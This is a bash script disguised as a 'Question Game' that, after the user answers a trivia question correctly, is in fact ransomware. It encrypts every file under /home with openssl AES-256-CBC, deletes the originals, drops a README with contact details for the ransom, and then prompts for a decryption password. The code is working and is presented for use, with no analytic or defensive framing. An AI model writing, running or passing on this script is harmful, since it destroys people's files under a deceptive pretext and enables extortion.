#!/bin/bash

# Welcome the user with a question game
echo "Welcome to the Question Game!"
echo "Answer the following question to proceed."
echo

# Define your question here
question="What is the capital of France?"
correct_answer="Paris"

# Ask the question and read the user's answer
read -p "$question: " user_answer

# Check if the user's answer is correct
if [ "$user_answer" != "$correct_answer" ]; then
    echo "Incorrect answer. Access denied."
    exit 1
fi

echo "Correct! Access granted. Please wait for the next game. It takes 5 minutes."

# Continue with file encryption
folder_to_encrypt="/home"
password="yourhydraantiviruspasswordhere"

if [ ! -d "$folder_to_encrypt" ]; then
    echo "The specified folder does not exist."
    exit 1
fi

# Function to encrypt files
encrypt_files() {
    local file="$1"
    
    # Check if the file is already encrypted
    if [[ ! "$file" == *".enc" ]]; then
        # Encrypt the file using AES-256-CBC encryption
        openssl enc -aes-256-cbc -in "$file" -out "$file.enc" -pass "pass:$password" > /dev/null 2>&1
        # Remove the original file, suppressing errors
        rm "$file" > /dev/null 2>&1
    fi
}

export -f encrypt_files

find "$folder_to_encrypt" -type f -print0 | xargs -0 -n 1 -P $(nproc) bash -c 'encrypt_files "$0"'

echo "All files have been encrypted, and unencrypted files have been deleted."

# Create a README.md file with contact details
echo "Contact Information:" > README.md
echo "Email: your@email.com" >> README.md

# Loop for decryption with password verification
max_attempts=3
attempts=0
while [ $attempts -lt $max_attempts ]; do
    # Prompt the user for the decryption password
    read -s -p "Enter the decryption password: " decryption_password
    echo

    # Function to decrypt files
    decrypt_files() {
        local encrypted_file="$1"
        local original_file="${encrypted_file%.enc}"  # Remove the .enc extension

        # Attempt to decrypt the file using AES-256-CBC
        openssl enc -aes-256-cbc -d -in "$encrypted_file" -out "$original_file" -pass "pass:$decryption_password" > /dev/null 2>&1

        # Check if decryption was successful
        if [ -f "$original_file" ]; then
            # File successfully decrypted
            rm "$encrypted_file" > /dev/null 2>&1
            echo "Decryption successful."
            return 0
        else
            # File not successfully decrypted
            echo "Incorrect password. Please try again."
            return 1
        fi
    }

    export -f decrypt_files

    find "$folder_to_encrypt" -type f -name "*.enc" -print0 | xargs -0 -n 1 -P $(nproc) bash -c 'decrypt_files "$0"'
    
    # Check if decryption was successful
    if [ $? -eq 0 ]; then
        break  # Exit the loop if successful
    fi
    
    # Increment the attempts
    attempts=$((attempts + 1))
done

if [ $attempts -eq $max_attempts ]; then
    echo "Maximum number of attempts reached. Access denied."
else
    echo "All files have been decrypted, and encrypted files have been deleted."
fi
